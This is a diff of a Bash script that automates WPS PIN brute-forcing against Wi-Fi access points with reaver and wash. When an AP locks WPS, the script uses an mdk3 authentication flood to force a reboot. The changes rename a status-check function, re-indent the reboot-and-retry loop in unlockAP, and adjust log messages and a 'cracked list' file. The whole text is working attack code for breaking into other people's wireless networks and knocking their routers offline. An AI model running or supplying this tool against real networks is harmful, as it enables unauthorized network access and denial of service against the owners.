@@ -337,18 +337,12 @@ setAutoReaverOpt(){
 }
 
 reaverConfig(){
-	unset option ARR_REAVER_OPT;
-	declare ARR_REAVER_OPT;
-
-
-
-	unset ARR_REAVER_OPT;
+	local REAVER_OUTPUT;
 }
 
-checkAPLockStatus(){
+checkAPStatus(){
 	local CMD_LOCK_STATUS;
 	local WASH_OUTPUT;
-	local AP_DETECTED=0;
 
 	CMD_LOCK_STATUS="timeout --preserve-status $CHECK_APLOCK_TIMEOUT wash -i $WIFI_CARD_MONITOR";
 	echoBlue "Checking AP Lock Status (Timeout For Result In $CHECK_APLOCK_TIMEOUT Sec)......";
@@ -363,8 +357,6 @@ checkAPLockStatus(){
 	eval $CMD_LOCK_STATUS | {
 		while read -r WASH_OUTPUT; do
 			if [[ $(echo "$WASH_OUTPUT" | grep -ic "$AP_BSSID") != 0 ]]; then
-				AP_DETECTED=1;
-
 				if [[ $(awk '{ print $5 }' <<< $WASH_OUTPUT) -eq "Yes" ]]; then
 					echo $(date +"%d/%m/%Y %H:%M:%S AP_CHECK_STATUS_LOCKED") >> $STATUS_FILE;
 					echoRed "AP Is Locked......";
@@ -373,14 +365,12 @@ checkAPLockStatus(){
 					echoGreen "AP Is UnLocked......";
 				fi
 			else
-				AP_DETECTED=0;
+				if [[ $AP_DETECTED == 0 ]]; then
+					echo $(date +"%d/%m/%Y %H:%M:%S AP_NOT_FOUND") >> $STATUS_FILE;
+					echoRed "AP Not Found......";
+				fi
 			fi
 		done
-
-		if [[ $AP_DETECTED == 0 ]]; then
-			echo $(date +"%d/%m/%Y %H:%M:%S AP_NOT_FOUND") >> $STATUS_FILE;
-			echoRed "AP Not Found......";
-		fi
 
 		$(killall -I wash);
 	}
@@ -388,7 +378,6 @@ checkAPLockStatus(){
 
 unlockAP(){
 	while true; do
-
 		rm attack 2> null
 		rm ap_status 2> null
 		rm ap_channel 2> null
@@ -476,52 +465,52 @@ unlockAP(){
 			wait $airodump_pid 2> null
 		done
 
-	# Force a reboot in the AP to unlock WPS
-	((mdk3 $MON_INTERFACE a -a $AP_BSSID) 2>&1) > attack & mdk3_pid=$!
+		# Force a reboot in the AP to unlock WPS
+		((mdk3 $MON_INTERFACE a -a $AP_BSSID) 2>&1) > attack & mdk3_pid=$!
 
-	echo -e "\n\n"
+		echo -e "\n\n"
 
-	while [ -n "$(grep Locked ap_status -m 1)" ] && [ -n "$(grep $AP_SSID ap_status -m 1)" ]; do
-		((airodump-ng $MON_INTERFACE --wps --essid $AP_SSID -c $channel) 2>&1) > ap_status &
-		airodump_pid=$!
-		sleep 4
-		waitTryReboot=$[waitTryReboot + 4]
-		echo -e -n "\rTry calling reboot AP. Wait $waitTryReboot sec."
-		kill -9 $airodump_pid
-		wait $airodump_pid 2> null
+		while [ -n "$(grep Locked ap_status -m 1)" ] && [ -n "$(grep $AP_SSID ap_status -m 1)" ]; do
+			((airodump-ng $MON_INTERFACE --wps --essid $AP_SSID -c $channel) 2>&1) > ap_status &
+			airodump_pid=$!
+			sleep 4
+			waitTryReboot=$[waitTryReboot + 4]
+			echo -e -n "\rTry calling reboot AP. Wait $waitTryReboot sec."
+			kill -9 $airodump_pid
+			wait $airodump_pid 2> null
+		done
+
+		# The AP is now rebooted. Kill the mdk3 process and wait 2 mins to restart reaver attack
+		kill -9 $mdk3_pid
+		wait $mdk3_pid 2> null
+		totalTryPin=`cat $countFile`
+		totalTryPin=$(($totalTryPin + $countTryPin))
+		echo $totalTryPin > $countFile
+		echo -e "\n\n"
+
+		while [ -z "$(grep $AP_SSID ap_status)" ]; do
+			# After reboot AP may be change channel. Run without channel
+			((airodump-ng $MON_INTERFACE --wps --essid $AP_SSID) 2>&1) > ap_status & airodump_pid=$!
+			sleep 5
+			waitReboot=$[waitReboot + 5]
+			echo -e -n "\rAP rebooting. Wait $waitReboot sec."
+			kill -9 $airodump_pid
+			wait $airodump_pid 2> null
+		done
+
+		rm attack
+		rm ap_status
+		rm null
+
+		execTime=$(($SECONDS+$waitTryReboot+$waitReboot))
+		echo -e "\n\nDone $countTryPin try pin.\
+			\nCalling reboot AP wait time $waitTryReboot sec.\
+			\nAP rebooting wait time $waitReboot sec.\
+			\nTotal execute time $SECONDS sec.\
+			\nTotal try pin $totalTryPin\n\n"
+		sleep 3
+		SECONDS=0
 	done
-
-	# The AP is now rebooted. Kill the mdk3 process and wait 2 mins to restart reaver attack
-	kill -9 $mdk3_pid
-	wait $mdk3_pid 2> null
-	totalTryPin=`cat $countFile`
-	totalTryPin=$(($totalTryPin + $countTryPin))
-	echo $totalTryPin > $countFile
-	echo -e "\n\n"
-
-	while [ -z "$(grep $AP_SSID ap_status)" ]; do
-		# After reboot AP may be change channel. Run without channel
-		((airodump-ng $MON_INTERFACE --wps --essid $AP_SSID) 2>&1) > ap_status & airodump_pid=$!
-		sleep 5
-		waitReboot=$[waitReboot + 5]
-		echo -e -n "\rAP rebooting. Wait $waitReboot sec."
-		kill -9 $airodump_pid
-		wait $airodump_pid 2> null
-	done
-
-	rm attack
-	rm ap_status
-	rm null
-
-	execTime=$(($SECONDS+$waitTryReboot+$waitReboot))
-	echo -e "\n\nDone $countTryPin try pin.\
-		\nCalling reboot AP wait time $waitTryReboot sec.\
-		\nAP rebooting wait time $waitReboot sec.\
-		\nTotal execute time $SECONDS sec.\
-		\nTotal try pin $totalTryPin\n\n"
-	sleep 3
-	SECONDS=0
-done
 }
 
 getRandomMac(){
@@ -800,6 +789,7 @@ while true; do
 	done
 
 	if [[ $PROCEED == 1 ]]; then
+		PROCEED=0;
 		break;
 	fi
 done
@@ -820,7 +810,6 @@ else
 fi
 
 if [[ ! -f $CRACKED_LIST_FILE ]]; then
-	echoOrange "Cracked List File Not Found......";
 	touch $CRACKED_LIST_FILE;
 	echoGreen "Cracked List File Created......";
 else
@@ -869,14 +858,14 @@ while true; do
 		if [[ "$AP_LOCK" == "Yes" ]]; then
 			echoRed "AP Locked......";
 			break;
-			### ADDING MDK3 FLOOD ATTACK FUNCTION TO REBOOT AP IN THE FUTURE ###
+			### ADDING MDK3 FLOOD ATTACK FUNCTION TO REBOOT AP  ###
 		else
 			### checkLockStatus;
 
 			if [[ "$AP_LOCK" == "Yes" ]]; then
 				echoRed "AP Locked......";
 				break;
-				### ADDING MDK3 FLOOD ATTACK FUNCTION TO REBOOT AP IN THE FUTURE ###
+				### ADDING MDK3 FLOOD ATTACK FUNCTION TO REBOOT AP ###
 			else
 				if [[ $REAVER_ATTEMPT_DELAY -ge $MAX_DELAY_PIN ]]; then
 					echoRed "Delay Between PIN Attempt Reached $REAVER_ATTEMPT_DELAY Sec.";
